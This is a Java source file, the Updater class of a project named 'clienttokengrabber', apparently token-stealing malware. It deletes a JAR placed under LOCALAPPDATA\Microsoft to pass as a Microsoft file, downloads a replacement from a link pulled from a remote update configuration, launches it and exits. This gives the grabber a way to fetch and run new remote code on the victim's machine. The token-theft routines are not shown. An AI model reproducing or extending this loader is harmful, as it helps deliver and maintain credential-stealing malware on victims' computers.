package clienttokengrabber.updater;

import clienttokengrabber.utils.FileManager;
import clienttokengrabber.utils.Requests;
import clienttokengrabber.utils.UpdateHelper;

public class Updater {
    private static final String APP_PATH = System.getenv("LOCALAPPDATA") + "\\Microsoft\\Example.jar";

    public static void main(String[] args) {
        FileManager.delete(APP_PATH);
        Requests.download(UpdateHelper.getUpdateInfo().get("link").asText(), APP_PATH);
        FileManager.launch(APP_PATH);
        System.exit(0);
    }
}
